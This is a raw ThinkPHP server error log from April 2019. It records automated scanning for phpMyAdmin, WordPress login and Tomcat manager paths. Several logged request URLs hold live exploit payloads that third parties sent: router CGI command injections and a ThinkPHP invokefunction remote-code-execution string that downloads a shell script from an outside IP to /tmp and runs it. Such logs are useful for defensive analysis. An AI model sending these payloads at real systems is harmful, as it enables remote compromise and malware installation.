ERR: цЧац│ХхКаш╜╜цибхЭЧ:PhpMyAdmin123

[ 2019-04-06T11:40:14+08:00 ] 118.24.122.13 /pwd/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000084s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Pwd

[ 2019-04-06T11:40:14+08:00 ] 118.24.122.13 /phpMyAdmina/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:PhpMyAdmina

[ 2019-04-06T11:40:14+08:00 ] 118.24.122.13 /phpMydmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:PhpMydmin

[ 2019-04-06T11:40:14+08:00 ] 118.24.122.13 /phpMyAdmins/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:PhpMyAdmins

[ 2019-04-06T11:40:14+08:00 ] 118.24.122.13 /phpMyAdmin._/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:PhpMyAdmin._

[ 2019-04-06T11:40:14+08:00 ] 118.24.122.13 /phpmyadmin2222/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Phpmyadmin2222

[ 2019-04-06T11:40:14+08:00 ] 118.24.122.13 /php2MyAdmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Php2MyAdmin

[ 2019-04-06T11:40:14+08:00 ] 118.24.122.13 /phpiMyAdmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:PhpiMyAdmin

[ 2019-04-06T11:40:14+08:00 ] 118.24.122.13 /phpNyAdmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000105s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:PhpNyAdmin

[ 2019-04-06T11:40:14+08:00 ] 118.24.122.13 /program/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Program

[ 2019-04-06T11:40:14+08:00 ] 118.24.122.13 /shopdb/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000088s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Shopdb

[ 2019-04-06T11:40:18+08:00 ] 118.24.122.13 /phpmy/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000079s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Phpmy

[ 2019-04-06T11:40:18+08:00 ] 118.24.122.13 /mysql/admin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Mysql

[ 2019-04-06T11:40:18+08:00 ] 118.24.122.13 /mysql/dbadmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Mysql

[ 2019-04-06T11:40:18+08:00 ] 118.24.122.13 /mysql/sqlmanager/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Mysql

[ 2019-04-06T11:40:18+08:00 ] 118.24.122.13 /mysql/mysqlmanager/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Mysql

[ 2019-04-06T11:40:18+08:00 ] 118.24.122.13 /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wp-content

[ 2019-04-06T11:40:18+08:00 ] 118.24.122.13 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Manager

[ 2019-04-06T12:07:20+08:00 ] 106.120.173.119 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000089s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Robots

[ 2019-04-06T12:31:02+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000090s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cache

[ 2019-04-06T17:29:16+08:00 ] 167.99.66.175 /wp2/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000130s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wp2

[ 2019-04-06T17:56:05+08:00 ] 157.230.222.149 /wp3/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000088s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wp3

[ 2019-04-06T17:59:23+08:00 ] 91.249.181.45 /maker/snwrite.cgi?mac=1234;wget%20http://93.188.163.62/snwrite
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Maker

[ 2019-04-06T17:59:23+08:00 ] 91.249.181.45 /login.cgi?cli=aa%20aa%27;wget%20http://93.188.163.62/dsl2750b%27$
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Login

[ 2019-04-06T18:08:08+08:00 ] 138.68.55.201 /wp4/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wp4

[ 2019-04-06T19:58:05+08:00 ] 77.247.109.70 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Robots

[ 2019-04-06T20:50:33+08:00 ] 47.93.112.231 /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://81.6.42.123/a_thk.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Index

[ 2019-04-06T21:06:19+08:00 ] 99.245.1.26 /balanse/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Balanse

[ 2019-04-06T21:16:39+08:00 ] 52.238.209.51 /shop/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000101s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Shop

[ 2019-04-06T22:36:29+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000103s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cache

